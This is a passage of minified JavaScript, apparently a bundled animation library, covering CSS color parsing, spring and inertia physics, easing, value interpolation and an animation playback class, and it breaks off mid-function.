const hP = /^(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))$/iu
  , ch = (e, t) => n => !!(typeof n == "string" && hP.test(n) && n.startsWith(e) || t && !fP(n) && Object.prototype.hasOwnProperty.call(n, t))
  , S1 = (e, t, n) => r => {
    if (typeof r != "string")
      return r;
    const [s, o, i, l] = r.match(lh);
    return {
      [e]: parseFloat(s),
      [t]: parseFloat(o),
      [n]: parseFloat(i),
      alpha: l !== void 0 ? parseFloat(l) : 1
    }
  }
  , mP = e => Bn(0, 255, e)
  , au = {
    ...fo,
    transform: e => Math.round(mP(e))
  }
  , Br = {
    test: ch("rgb", "red"),
    parse: S1("red", "green", "blue"),
    transform: ({ red: e, green: t, blue: n, alpha: r = 1 }) => "rgba(" + au.transform(e) + ", " + au.transform(t) + ", " + au.transform(n) + ", " + Xo(Ni.transform(r)) + ")"
  };
function pP(e) {
  let t = ""
    , n = ""
    , r = ""
    , s = "";
  return e.length > 5 ? (t = e.substring(1, 3),
    n = e.substring(3, 5),
    r = e.substring(5, 7),
    s = e.substring(7, 9)) : (t = e.substring(1, 2),
      n = e.substring(2, 3),
      r = e.substring(3, 4),
      s = e.substring(4, 5),
      t += t,
      n += n,
      r += r,
      s += s),
  {
    red: parseInt(t, 16),
    green: parseInt(n, 16),
    blue: parseInt(r, 16),
    alpha: s ? parseInt(s, 16) / 255 : 1
  }
}
const Ed = {
  test: ch("#"),
  parse: pP,
  transform: Br.transform
}
  , Cs = {
    test: ch("hsl", "hue"),
    parse: S1("hue", "saturation", "lightness"),
    transform: ({ hue: e, saturation: t, lightness: n, alpha: r = 1 }) => "hsla(" + Math.round(e) + ", " + pn.transform(Xo(t)) + ", " + pn.transform(Xo(n)) + ", " + Xo(Ni.transform(r)) + ")"
  }
  , Ke = {
    test: e => Br.test(e) || Ed.test(e) || Cs.test(e),
    parse: e => Br.test(e) ? Br.parse(e) : Cs.test(e) ? Cs.parse(e) : Ed.parse(e),
    transform: e => typeof e == "string" ? e : e.hasOwnProperty("red") ? Br.transform(e) : Cs.transform(e)
  }
  , gP = /(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))/giu;
function yP(e) {
  var t, n;
  return isNaN(e) && typeof e == "string" && (((t = e.match(lh)) === null || t === void 0 ? void 0 : t.length) || 0) + (((n = e.match(gP)) === null || n === void 0 ? void 0 : n.length) || 0) > 0
}
const C1 = "number"
  , N1 = "color"
  , vP = "var"
  , xP = "var("
  , Lp = "${}"
  , wP = /var\s*\(\s*--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)|#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\)|-?(?:\d+(?:\.\d+)?|\.\d+)/giu;
function ji(e) {
  const t = e.toString()
    , n = []
    , r = {
      color: [],
      number: [],
      var: []
    }
    , s = [];
  let o = 0;
  const l = t.replace(wP, c => (Ke.test(c) ? (r.color.push(o),
    s.push(N1),
    n.push(Ke.parse(c))) : c.startsWith(xP) ? (r.var.push(o),
      s.push(vP),
      n.push(c)) : (r.number.push(o),
        s.push(C1),
        n.push(parseFloat(c))),
    ++o,
    Lp)).split(Lp);
  return {
    values: n,
    split: l,
    indexes: r,
    types: s
  }
}
function j1(e) {
  return ji(e).values
}
function P1(e) {
  const { split: t, types: n } = ji(e)
    , r = t.length;
  return s => {
    let o = "";
    for (let i = 0; i < r; i++)
      if (o += t[i],
        s[i] !== void 0) {
        const l = n[i];
        l === C1 ? o += Xo(s[i]) : l === N1 ? o += Ke.transform(s[i]) : o += s[i]
      }
    return o
  }
}
const bP = e => typeof e == "number" ? 0 : e;
function SP(e) {
  const t = j1(e);
  return P1(e)(t.map(bP))
}
const Nr = {
  test: yP,
  parse: j1,
  createTransformer: P1,
  getAnimatableNone: SP
}
  , CP = new Set(["brightness", "contrast", "saturate", "opacity"]);
function NP(e) {
  const [t, n] = e.slice(0, -1).split("(");
  if (t === "drop-shadow")
    return e;
  const [r] = n.match(lh) || [];
  if (!r)
    return e;
  const s = n.replace(r, "");
  let o = CP.has(t) ? 1 : 0;
  return r !== n && (o *= 100),
    t + "(" + o + s + ")"
}
const jP = /\b([a-z-]*)\(.*?\)/gu
  , Td = {
    ...Nr,
    getAnimatableNone: e => {
      const t = e.match(jP);
      return t ? t.map(NP).join(" ") : e
    }
  }
  , PP = {
    borderWidth: Y,
    borderTopWidth: Y,
    borderRightWidth: Y,
    borderBottomWidth: Y,
    borderLeftWidth: Y,
    borderRadius: Y,
    radius: Y,
    borderTopLeftRadius: Y,
    borderTopRightRadius: Y,
    borderBottomRightRadius: Y,
    borderBottomLeftRadius: Y,
    width: Y,
    maxWidth: Y,
    height: Y,
    maxHeight: Y,
    top: Y,
    right: Y,
    bottom: Y,
    left: Y,
    padding: Y,
    paddingTop: Y,
    paddingRight: Y,
    paddingBottom: Y,
    paddingLeft: Y,
    margin: Y,
    marginTop: Y,
    marginRight: Y,
    marginBottom: Y,
    marginLeft: Y,
    backgroundPositionX: Y,
    backgroundPositionY: Y
  }
  , AP = {
    rotate: Xn,
    rotateX: Xn,
    rotateY: Xn,
    rotateZ: Xn,
    scale: xa,
    scaleX: xa,
    scaleY: xa,
    scaleZ: xa,
    skew: Xn,
    skewX: Xn,
    skewY: Xn,
    distance: Y,
    translateX: Y,
    translateY: Y,
    translateZ: Y,
    x: Y,
    y: Y,
    z: Y,
    perspective: Y,
    transformPerspective: Y,
    opacity: Ni,
    originX: Mp,
    originY: Mp,
    originZ: Y
  }
  , Fp = {
    ...fo,
    transform: Math.round
  }
  , uh = {
    ...PP,
    ...AP,
    zIndex: Fp,
    size: Y,
    fillOpacity: Ni,
    strokeOpacity: Ni,
    numOctaves: Fp
  }
  , EP = {
    ...uh,
    color: Ke,
    backgroundColor: Ke,
    outlineColor: Ke,
    fill: Ke,
    stroke: Ke,
    borderColor: Ke,
    borderTopColor: Ke,
    borderRightColor: Ke,
    borderBottomColor: Ke,
    borderLeftColor: Ke,
    filter: Td,
    WebkitFilter: Td
  }
  , dh = e => EP[e];
function A1(e, t) {
  let n = dh(e);
  return n !== Td && (n = Nr),
    n.getAnimatableNone ? n.getAnimatableNone(t) : void 0
}
const TP = new Set(["auto", "none", "0"]);
function kP(e, t, n) {
  let r = 0, s;
  for (; r < e.length && !s;) {
    const o = e[r];
    typeof o == "string" && !TP.has(o) && ji(o).values.length && (s = e[r]),
      r++
  }
  if (s && n)
    for (const o of t)
      e[o] = A1(n, s)
}
class E1 extends ah {
  constructor(t, n, r, s, o) {
    super(t, n, r, s, o, !0)
  }
  readKeyframes() {
    const { unresolvedKeyframes: t, element: n, name: r } = this;
    if (!n || !n.current)
      return;
    super.readKeyframes();
    for (let c = 0; c < t.length; c++) {
      let u = t[c];
      if (typeof u == "string" && (u = u.trim(),
        ih(u))) {
        const d = y1(u, n.current);
        d !== void 0 && (t[c] = d),
          c === t.length - 1 && (this.finalKeyframe = u)
      }
    }
    if (this.resolveNoneKeyframes(),
      !iP.has(r) || t.length !== 2)
      return;
    const [s, o] = t
      , i = _p(s)
      , l = _p(o);
    if (i !== l)
      if (Rp(i) && Rp(l))
        for (let c = 0; c < t.length; c++) {
          const u = t[c];
          typeof u == "string" && (t[c] = parseFloat(u))
        }
      else
        this.needsMeasurement = !0
  }
  resolveNoneKeyframes() {
    const { unresolvedKeyframes: t, name: n } = this
      , r = [];
    for (let s = 0; s < t.length; s++)
      Z3(t[s]) && r.push(s);
    r.length && kP(t, r, n)
  }
  measureInitialState() {
    const { element: t, unresolvedKeyframes: n, name: r } = this;
    if (!t || !t.current)
      return;
    r === "height" && (this.suspendedScrollY = window.pageYOffset),
      this.measuredOrigin = ro[r](t.measureViewportBox(), window.getComputedStyle(t.current)),
      n[0] = this.measuredOrigin;
    const s = n[n.length - 1];
    s !== void 0 && t.getValue(r, s).jump(s, !1)
  }
  measureEndState() {
    var t;
    const { element: n, name: r, unresolvedKeyframes: s } = this;
    if (!n || !n.current)
      return;
    const o = n.getValue(r);
    o && o.jump(this.measuredOrigin, !1);
    const i = s.length - 1
      , l = s[i];
    s[i] = ro[r](n.measureViewportBox(), window.getComputedStyle(n.current)),
      l !== null && this.finalKeyframe === void 0 && (this.finalKeyframe = l),
      !((t = this.removedTransforms) === null || t === void 0) && t.length && this.removedTransforms.forEach(([c, u]) => {
        n.getValue(c).set(u)
      }
      ),
      this.resolveNoneKeyframes()
  }
}
function fh(e) {
  return typeof e == "function"
}
let Fa;
function DP() {
  Fa = void 0
}
const gn = {
  now: () => (Fa === void 0 && gn.set(Be.isProcessing || Q3.useManualTiming ? Be.timestamp : performance.now()),
    Fa),
  set: e => {
    Fa = e,
      queueMicrotask(DP)
  }
}
  , Vp = (e, t) => t === "zIndex" ? !1 : !!(typeof e == "number" || Array.isArray(e) || typeof e == "string" && (Nr.test(e) || e === "0") && !e.startsWith("url("));
function MP(e) {
  const t = e[0];
  if (e.length === 1)
    return !0;
  for (let n = 0; n < e.length; n++)
    if (e[n] !== t)
      return !0
}
function RP(e, t, n, r) {
  const s = e[0];
  if (s === null)
    return !1;
  if (t === "display" || t === "visibility")
    return !0;
  const o = e[e.length - 1]
    , i = Vp(s, t)
    , l = Vp(o, t);
  return !i || !l ? !1 : MP(e) || (n === "spring" || fh(n)) && r
}
const OP = 40;
class T1 {
  constructor({ autoplay: t = !0, delay: n = 0, type: r = "keyframes", repeat: s = 0, repeatDelay: o = 0, repeatType: i = "loop", ...l }) {
    this.isStopped = !1,
      this.hasAttemptedResolve = !1,
      this.createdAt = gn.now(),
      this.options = {
        autoplay: t,
        delay: n,
        type: r,
        repeat: s,
        repeatDelay: o,
        repeatType: i,
        ...l
      },
      this.updateFinishedPromise()
  }
  calcStartTime() {
    return this.resolvedAt ? this.resolvedAt - this.createdAt > OP ? this.resolvedAt : this.createdAt : this.createdAt
  }
  get resolved() {
    return !this._resolved && !this.hasAttemptedResolve && dP(),
      this._resolved
  }
  onKeyframesResolved(t, n) {
    this.resolvedAt = gn.now(),
      this.hasAttemptedResolve = !0;
    const { name: r, type: s, velocity: o, delay: i, onComplete: l, onUpdate: c, isGenerator: u } = this.options;
    if (!u && !RP(t, r, s, o))
      if (i)
        this.options.duration = 0;
      else {
        c == null || c(sc(t, this.options, n)),
          l == null || l(),
          this.resolveFinishedPromise();
        return
      }
    const d = this.initPlayback(t, n);
    d !== !1 && (this._resolved = {
      keyframes: t,
      finalKeyframe: n,
      ...d
    },
      this.onPostResolved())
  }
  onPostResolved() { }
  then(t, n) {
    return this.currentFinishedPromise.then(t, n)
  }
  flatten() {
    this.options.type = "keyframes",
      this.options.ease = "linear"
  }
  updateFinishedPromise() {
    this.currentFinishedPromise = new Promise(t => {
      this.resolveFinishedPromise = t
    }
    )
  }
}
const so = (e, t, n) => {
  const r = t - e;
  return r === 0 ? 1 : (n - e) / r
}
  , k1 = (e, t, n = 10) => {
    let r = "";
    const s = Math.max(Math.round(t / n), 2);
    for (let o = 0; o < s; o++)
      r += e(so(0, s - 1, o)) + ", ";
    return `linear(${r.substring(0, r.length - 2)})`
  }
  ;
function D1(e, t) {
  return t ? e * (1e3 / t) : 0
}
const IP = 5;
function M1(e, t, n) {
  const r = Math.max(t - IP, 0);
  return D1(n - e(r), t - r)
}
const Ne = {
  stiffness: 100,
  damping: 10,
  mass: 1,
  velocity: 0,
  duration: 800,
  bounce: .3,
  visualDuration: .3,
  restSpeed: {
    granular: .01,
    default: 2
  },
  restDelta: {
    granular: .005,
    default: .5
  },
  minDuration: .01,
  maxDuration: 10,
  minDamping: .05,
  maxDamping: 1
}
  , lu = .001;
function _P({ duration: e = Ne.duration, bounce: t = Ne.bounce, velocity: n = Ne.velocity, mass: r = Ne.mass }) {
  let s, o, i = 1 - t;
  i = Bn(Ne.minDamping, Ne.maxDamping, i),
    e = Bn(Ne.minDuration, Ne.maxDuration, On(e)),
    i < 1 ? (s = u => {
      const d = u * i
        , f = d * e
        , h = d - n
        , y = kd(u, i)
        , b = Math.exp(-f);
      return lu - h / y * b
    }
      ,
      o = u => {
        const f = u * i * e
          , h = f * n + n
          , y = Math.pow(i, 2) * Math.pow(u, 2) * e
          , b = Math.exp(-f)
          , v = kd(Math.pow(u, 2), i);
        return (-s(u) + lu > 0 ? -1 : 1) * ((h - y) * b) / v
      }
    ) : (s = u => {
      const d = Math.exp(-u * e)
        , f = (u - n) * e + 1;
      return -lu + d * f
    }
      ,
      o = u => {
        const d = Math.exp(-u * e)
          , f = (n - u) * (e * e);
        return d * f
      }
    );
  const l = 5 / e
    , c = FP(s, o, l);
  if (e = Rn(e),
    isNaN(c))
    return {
      stiffness: Ne.stiffness,
      damping: Ne.damping,
      duration: e
    };
  {
    const u = Math.pow(c, 2) * r;
    return {
      stiffness: u,
      damping: i * 2 * Math.sqrt(r * u),
      duration: e
    }
  }
}
const LP = 12;
function FP(e, t, n) {
  let r = n;
  for (let s = 1; s < LP; s++)
    r = r - e(r) / t(r);
  return r
}
function kd(e, t) {
  return e * Math.sqrt(1 - t * t)
}
const Dd = 2e4;
function R1(e) {
  let t = 0;
  const n = 50;
  let r = e.next(t);
  for (; !r.done && t < Dd;)
    t += n,
      r = e.next(t);
  return t >= Dd ? 1 / 0 : t
}
const VP = ["duration", "bounce"]
  , BP = ["stiffness", "damping", "mass"];
function Bp(e, t) {
  return t.some(n => e[n] !== void 0)
}
function zP(e) {
  let t = {
    velocity: Ne.velocity,
    stiffness: Ne.stiffness,
    damping: Ne.damping,
    mass: Ne.mass,
    isResolvedFromDuration: !1,
    ...e
  };
  if (!Bp(e, BP) && Bp(e, VP))
    if (e.visualDuration) {
      const n = e.visualDuration
        , r = 2 * Math.PI / (n * 1.2)
        , s = r * r
        , o = 2 * Bn(.05, 1, 1 - e.bounce) * Math.sqrt(s);
      t = {
        ...t,
        mass: Ne.mass,
        stiffness: s,
        damping: o
      }
    } else {
      const n = _P(e);
      t = {
        ...t,
        ...n,
        mass: Ne.mass
      },
        t.isResolvedFromDuration = !0
    }
  return t
}
function O1(e = Ne.visualDuration, t = Ne.bounce) {
  const n = typeof e != "object" ? {
    visualDuration: e,
    keyframes: [0, 1],
    bounce: t
  } : e;
  let { restSpeed: r, restDelta: s } = n;
  const o = n.keyframes[0]
    , i = n.keyframes[n.keyframes.length - 1]
    , l = {
      done: !1,
      value: o
    }
    , { stiffness: c, damping: u, mass: d, duration: f, velocity: h, isResolvedFromDuration: y } = zP({
      ...n,
      velocity: -On(n.velocity || 0)
    })
    , b = h || 0
    , v = u / (2 * Math.sqrt(c * d))
    , C = i - o
    , g = On(Math.sqrt(c / d))
    , m = Math.abs(C) < 5;
  r || (r = m ? Ne.restSpeed.granular : Ne.restSpeed.default),
    s || (s = m ? Ne.restDelta.granular : Ne.restDelta.default);
  let p;
  if (v < 1) {
    const S = kd(g, v);
    p = N => {
      const P = Math.exp(-v * g * N);
      return i - P * ((b + v * g * C) / S * Math.sin(S * N) + C * Math.cos(S * N))
    }
  } else if (v === 1)
    p = S => i - Math.exp(-g * S) * (C + (b + g * C) * S);
  else {
    const S = g * Math.sqrt(v * v - 1);
    p = N => {
      const P = Math.exp(-v * g * N)
        , A = Math.min(S * N, 300);
      return i - P * ((b + v * g * C) * Math.sinh(A) + S * C * Math.cosh(A)) / S
    }
  }
  const w = {
    calculatedDuration: y && f || null,
    next: S => {
      const N = p(S);
      if (y)
        l.done = S >= f;
      else {
        let P = 0;
        v < 1 && (P = S === 0 ? Rn(b) : M1(p, S, N));
        const A = Math.abs(P) <= r
          , k = Math.abs(i - N) <= s;
        l.done = A && k
      }
      return l.value = l.done ? i : N,
        l
    }
    ,
    toString: () => {
      const S = Math.min(R1(w), Dd)
        , N = k1(P => w.next(S * P).value, S, 30);
      return S + "ms " + N
    }
  };
  return w
}
function zp({ keyframes: e, velocity: t = 0, power: n = .8, timeConstant: r = 325, bounceDamping: s = 10, bounceStiffness: o = 500, modifyTarget: i, min: l, max: c, restDelta: u = .5, restSpeed: d }) {
  const f = e[0]
    , h = {
      done: !1,
      value: f
    }
    , y = A => l !== void 0 && A < l || c !== void 0 && A > c
    , b = A => l === void 0 ? c : c === void 0 || Math.abs(l - A) < Math.abs(c - A) ? l : c;
  let v = n * t;
  const C = f + v
    , g = i === void 0 ? C : i(C);
  g !== C && (v = g - f);
  const m = A => -v * Math.exp(-A / r)
    , p = A => g + m(A)
    , w = A => {
      const k = m(A)
        , D = p(A);
      h.done = Math.abs(k) <= u,
        h.value = h.done ? g : D
    }
    ;
  let S, N;
  const P = A => {
    y(h.value) && (S = A,
      N = O1({
        keyframes: [h.value, b(h.value)],
        velocity: M1(p, A, h.value),
        damping: s,
        stiffness: o,
        restDelta: u,
        restSpeed: d
      }))
  }
    ;
  return P(0),
  {
    calculatedDuration: null,
    next: A => {
      let k = !1;
      return !N && S === void 0 && (k = !0,
        w(A),
        P(A)),
        S !== void 0 && A >= S ? N.next(A - S) : (!k && w(A),
          h)
    }
  }
}
const UP = Vi(.42, 0, 1, 1)
  , $P = Vi(0, 0, .58, 1)
  , I1 = Vi(.42, 0, .58, 1)
  , HP = e => Array.isArray(e) && typeof e[0] != "number"
  , hh = e => Array.isArray(e) && typeof e[0] == "number"
  , Up = {
    linear: Je,
    easeIn: UP,
    easeInOut: I1,
    easeOut: $P,
    circIn: oh,
    circInOut: f1,
    circOut: d1,
    backIn: sh,
    backInOut: c1,
    backOut: l1,
    anticipate: u1
  }
  , $p = e => {
    if (hh(e)) {
      jd(e.length === 4);
      const [t, n, r, s] = e;
      return Vi(t, n, r, s)
    } else if (typeof e == "string")
      return jd(Up[e] !== void 0),
        Up[e];
    return e
  }
  , WP = (e, t) => n => t(e(n))
  , xr = (...e) => e.reduce(WP)
  , we = (e, t, n) => e + (t - e) * n;
function cu(e, t, n) {
  return n < 0 && (n += 1),
    n > 1 && (n -= 1),
    n < 1 / 6 ? e + (t - e) * 6 * n : n < 1 / 2 ? t : n < 2 / 3 ? e + (t - e) * (2 / 3 - n) * 6 : e
}
function QP({ hue: e, saturation: t, lightness: n, alpha: r }) {
  e /= 360,
    t /= 100,
    n /= 100;
  let s = 0
    , o = 0
    , i = 0;
  if (!t)
    s = o = i = n;
  else {
    const l = n < .5 ? n * (1 + t) : n + t - n * t
      , c = 2 * n - l;
    s = cu(c, l, e + 1 / 3),
      o = cu(c, l, e),
      i = cu(c, l, e - 1 / 3)
  }
  return {
    red: Math.round(s * 255),
    green: Math.round(o * 255),
    blue: Math.round(i * 255),
    alpha: r
  }
}
function vl(e, t) {
  return n => n > 0 ? t : e
}
const uu = (e, t, n) => {
  const r = e * e
    , s = n * (t * t - r) + r;
  return s < 0 ? 0 : Math.sqrt(s)
}
  , qP = [Ed, Br, Cs]
  , GP = e => qP.find(t => t.test(e));
function Hp(e) {
  const t = GP(e);
  if (!t)
    return !1;
  let n = t.parse(e);
  return t === Cs && (n = QP(n)),
    n
}
const Wp = (e, t) => {
  const n = Hp(e)
    , r = Hp(t);
  if (!n || !r)
    return vl(e, t);
  const s = {
    ...n
  };
  return o => (s.red = uu(n.red, r.red, o),
    s.green = uu(n.green, r.green, o),
    s.blue = uu(n.blue, r.blue, o),
    s.alpha = we(n.alpha, r.alpha, o),
    Br.transform(s))
}
  , Md = new Set(["none", "hidden"]);
function KP(e, t) {
  return Md.has(e) ? n => n <= 0 ? e : t : n => n >= 1 ? t : e
}
function YP(e, t) {
  return n => we(e, t, n)
}
function mh(e) {
  return typeof e == "number" ? YP : typeof e == "string" ? ih(e) ? vl : Ke.test(e) ? Wp : ZP : Array.isArray(e) ? _1 : typeof e == "object" ? Ke.test(e) ? Wp : XP : vl
}
function _1(e, t) {
  const n = [...e]
    , r = n.length
    , s = e.map((o, i) => mh(o)(o, t[i]));
  return o => {
    for (let i = 0; i < r; i++)
      n[i] = s[i](o);
    return n
  }
}
function XP(e, t) {
  const n = {
    ...e,
    ...t
  }
    , r = {};
  for (const s in n)
    e[s] !== void 0 && t[s] !== void 0 && (r[s] = mh(e[s])(e[s], t[s]));
  return s => {
    for (const o in r)
      n[o] = r[o](s);
    return n
  }
}
function JP(e, t) {
  var n;
  const r = []
    , s = {
      color: 0,
      var: 0,
      number: 0
    };
  for (let o = 0; o < t.values.length; o++) {
    const i = t.types[o]
      , l = e.indexes[i][s[i]]
      , c = (n = e.values[l]) !== null && n !== void 0 ? n : 0;
    r[o] = c,
      s[i]++
  }
  return r
}
const ZP = (e, t) => {
  const n = Nr.createTransformer(t)
    , r = ji(e)
    , s = ji(t);
  return r.indexes.var.length === s.indexes.var.length && r.indexes.color.length === s.indexes.color.length && r.indexes.number.length >= s.indexes.number.length ? Md.has(e) && !s.values.length || Md.has(t) && !r.values.length ? KP(e, t) : xr(_1(JP(r, s), s.values), n) : vl(e, t)
}
  ;
function L1(e, t, n) {
  return typeof e == "number" && typeof t == "number" && typeof n == "number" ? we(e, t, n) : mh(e)(e, t)
}
function e4(e, t, n) {
  const r = []
    , s = n || L1
    , o = e.length - 1;
  for (let i = 0; i < o; i++) {
    let l = s(e[i], e[i + 1]);
    if (t) {
      const c = Array.isArray(t) ? t[i] || Je : t;
      l = xr(c, l)
    }
    r.push(l)
  }
  return r
}
function t4(e, t, { clamp: n = !0, ease: r, mixer: s } = {}) {
  const o = e.length;
  if (jd(o === t.length),
    o === 1)
    return () => t[0];
  if (o === 2 && e[0] === e[1])
    return () => t[1];
  e[0] > e[o - 1] && (e = [...e].reverse(),
    t = [...t].reverse());
  const i = e4(t, r, s)
    , l = i.length
    , c = u => {
      let d = 0;
      if (l > 1)
        for (; d < e.length - 2 && !(u < e[d + 1]); d++)
          ;
      const f = so(e[d], e[d + 1], u);
      return i[d](f)
    }
    ;
  return n ? u => c(Bn(e[0], e[o - 1], u)) : c
}
function n4(e, t) {
  const n = e[e.length - 1];
  for (let r = 1; r <= t; r++) {
    const s = so(0, t, r);
    e.push(we(n, 1, s))
  }
}
function r4(e) {
  const t = [0];
  return n4(t, e.length - 1),
    t
}
function s4(e, t) {
  return e.map(n => n * t)
}
function o4(e, t) {
  return e.map(() => t || I1).splice(0, e.length - 1)
}
function xl({ duration: e = 300, keyframes: t, times: n, ease: r = "easeInOut" }) {
  const s = HP(r) ? r.map($p) : $p(r)
    , o = {
      done: !1,
      value: t[0]
    }
    , i = s4(n && n.length === t.length ? n : r4(t), e)
    , l = t4(i, t, {
      ease: Array.isArray(s) ? s : o4(t, s)
    });
  return {
    calculatedDuration: e,
    next: c => (o.value = l(c),
      o.done = c >= e,
      o)
  }
}
const i4 = e => {
  const t = ({ timestamp: n }) => e(n);
  return {
    start: () => de.update(t, !0),
    stop: () => Cr(t),
    now: () => Be.isProcessing ? Be.timestamp : gn.now()
  }
}
  , a4 = {
    decay: zp,
    inertia: zp,
    tween: xl,
    keyframes: xl,
    spring: O1
  }
  , l4 = e => e / 100;
class ph extends T1 {
  constructor(t) {
    super(t),
      this.holdTime = null,
      this.cancelTime = null,
      this.currentTime = 0,
      this.playbackSpeed = 1,
      this.pendingPlayState = "running",
      this.startTime = null,
      this.state = "idle",
      this.stop = () => {
        if (this.resolver.cancel(),
          this.isStopped = !0,
          this.state === "idle")
          return;
        this.teardown();
        const { onStop: c } = this.options;
        c && c()
      }
      ;
    const { name: n, motionValue: r, element: s, keyframes: o } = this.options
      , i = (s == null ? void 0 : s.KeyframeResolver) || ah
      , l = (c, u) => this.onKeyframesResolved(c, u);
    this.resolver = new i(o, l, n, r, s),
      this.resolver.scheduleResolve()
  }
  flatten() {
    super.flatten(),
      this._resolved && Object.assign(this._resolved, this.initPlayback(this._resolved.keyframes))
  }
  initPlayback(t) {
    const { type: n = "keyframes", repeat: r = 0, repeatDelay: s = 0, repeatType: o, velocity: i = 0 } = this.options
      , l = fh(n) ? n : a4[n] || xl;
    let c, u;
    l !== xl && typeof t[0] != "number" && (c = xr(l4, L1(t[0], t[1])),
      t = [0, 100]);
    const d = l({
      ...this.options,
      keyframes: t
    });
    o === "mirror" && (u = l({
      ...this.options,
      keyframes: [...t].reverse(),
      velocity: -i
    })),
      d.calculatedDuration === null && (d.calculatedDuration = R1(d));
    const { calculatedDuration: f } = d
      , h = f + s
      , y = h * (r + 1) - s;
    return {
      generator: d,
      mirroredGenerator: u,
      mapPercentToKeyframes: c,
      calculatedDuration: f,
      resolvedDuration: h,
      totalDuration: y
    }
  }
  onPostResolved() {
    const { autoplay: t = !0 } = this.options;
    this.play(),
      this.pendingPlayState === "paused" || !t ? this.pause() : this.state = this.pendingPlayState
  }
  tick(t, n = !1) {
    const { resolved: r } = this;
    if (!r) {
      const { keyframes: A } = this.options;
      return {
        done: !0,
        value: A[A.length - 1]
      }
    }
    const { finalKeyframe: s, generator: o, mirroredGenerator: i, mapPercentToKeyframes: l, keyframes: c, calculatedDuration: u, totalDuration: d, resolvedDuration: f } = r;
    if (this.startTime === null)
      return o.next(0);
    const { delay: h, repeat: y, repeatType: b, repeatDelay: v, onUpdate: C } = this.options;
    this.speed > 0 ? this.startTime = Math.min(this.startTime, t) : this.speed < 0 && (this.startTime = Math.min(t - d / this.speed, this.startTime)),
      n ? this.currentTime = t : this.holdTime !== null ? this.currentTime = this.holdTime : this.currentTime = Math.round(t - this.startTime) * this.speed;
    const g = this.currentTime - h * (this.speed >= 0 ? 1 : -1)
      , m = this.speed >= 0 ? g < 0 : g > d;
    this.currentTime = Math.max(g, 0),
      this.state === "finished" && this.holdTime === null && (this.currentTime = d);
    let p = this.currentTime
      , w = o;
    if (y) {
      const A = Math.min(this.currentTime, d) / f;
      let k = Math.floor(A)
        , D = A % 1;
      !D && A >= 1 && (D = 1),
        D === 1 && k--,
        k = Math.min(k, y + 1),
        !!(k % 2) && (b === "reverse" ? (D = 1 - D,
          v && (D -= v / f)) : b === "mirror" && (w = i)),
        p = Bn(0, 1, D) * f
    }
    const S = m ? {
      done: !1,
      value: c[0]
    } : w.next(p);
    l && (S.value = l(S.value));
    let { done: N } = S;
    !m && u !== null && (N = this.speed >= 0 ? this.currentTime >= d : this.currentTime <= 0);
    const P = this.holdTime === null && (this.state === "finished" || this.state === "running" && N);
    return P && s !== void 0 && (S.value = sc(c, this.options, s)),
      C && C(S.value),
      P && this.finish(),
      S
  }
  get duration() {
    const { resolved: t } = this;
    return t ? On(t.calculatedDuration) : 0
  }
  get time() {
    return On(this.currentTime)
  }
  set time(t) {
    t = Rn(t),
      this.currentTime = t,
      this.holdTime !== null || this.speed === 0 ? this.holdTime = t : this.driver && (this.startTime = this.driver.now() - t / this.speed)
  }
  get speed() {
    return this.playbackSpeed
  }
  set speed(t) {
    const n = this.playbackSpeed !== t;
    this.playbackSpeed = t,
      n && (this.time = On(this.currentTime))
  }
  play() {
    if (this.resolver.isScheduled || this.resolver.resume(),
      !this._resolved) {
      this.pendingPlayState = "running";
      return
    }
    if (this.isStopped)
      return;
    const { driver: t = i4, onPlay: n, startTime: r } = this.options;
    this.driver || (this.driver = t(o => this.tick(o))),
      n && n();
    const s = this.driver.now();
    this.holdTime !== null ? this.startTime = s - this.holdTime : this.startTime ? this.state === "finished" && (this.startTime = s) : this.startTime = r ?? this.calcStartTime(),
      this.state === "finished" && this.updateFinishedPromise(),
      this.cancelTime = this.startTime,
      this.holdTime = null,
      this.state = "running",
      this.driver.start()
  }
  pause() {
    var t;
    if (!this._resolved) {
      this.pendingPlayState = "paused";
      return
    }
    this.state = "paused",
      this.holdTime = (t = this.currentTime) !== null && t !== void 0 ? t : 0
  }
  complete() {
    this.state !== "running" && this.play(),
      this.pendingPlayState = this.state = "finished",
      this.holdTime = null
  }
  finish() {
    this.teardown(),
      this.state = "finished";
    const { onComplete: t } = this.options;
    t && t()
  }
  cancel() {
    this.cancelTime !== null && this.tick(this.cancelTime),
      this.teardown(),
      this.updateFinishedPromise()
  }
  teardown() {
    this.state = "idle",
      this.stopDriver(),
      this.resolveFinishedPromise(),
      this.updateFinishedPromise(),
      this.startTime = this.cancelTime = null,
      this.resolver.cancel()
  }
  stopDriver() {
    this.driver && (this.driver.stop(),
      this.driver = void 0)
  }
  sample(t) {
    return this.startTime = 0,
      this.tick(t, !0)
  }
}
const c4 = new Set(["opacity", "clipPath", "filter", "transform"]);
function gh(e) {
  let t;
  return () => (t === void 0 && (t = e()),
    t)
}
const u4 = {
  linearEasing: void 0
};
function d4(e, t) {
  const n = gh(e);
  return () => {
    var r;
    return (r = u4[t]) !== null && r !== void 0 ? r : n()
  }
}
const wl = d4(() => {
  try {
    document.createElement("div").animate({
      opacity: 0
    }, {
      easing: "linear(0, 1)"
    })
  } catch {
    return !1
  }
  return !0
}
  , "linearEasing");
function F1(e) {
  return !!(typeof e == "function" && wl() || !e || typeof e == "string" && (e in Rd || wl()) || hh(e) || Array.isArray(e) && e.every(F1))
}
const Lo = ([e, t, n, r]) => `cubic-bezier(${e}, ${t}, ${n}, ${r})`
  , Rd = {
    linear: "linear",
    ease: "ease",
    easeIn: "ease-in",
    easeOut: "ease-out",
    easeInOut: "ease-in-out",
    circIn: Lo([0, .65, .55, 1]),
    circOut: Lo([.55, 0, 1, .45]),
    backIn: Lo([.31, .01, .66, -.59]),
    backOut: Lo([.33, 1.53, .69, .99])
  };
function V1(e, t) {
  if (e)
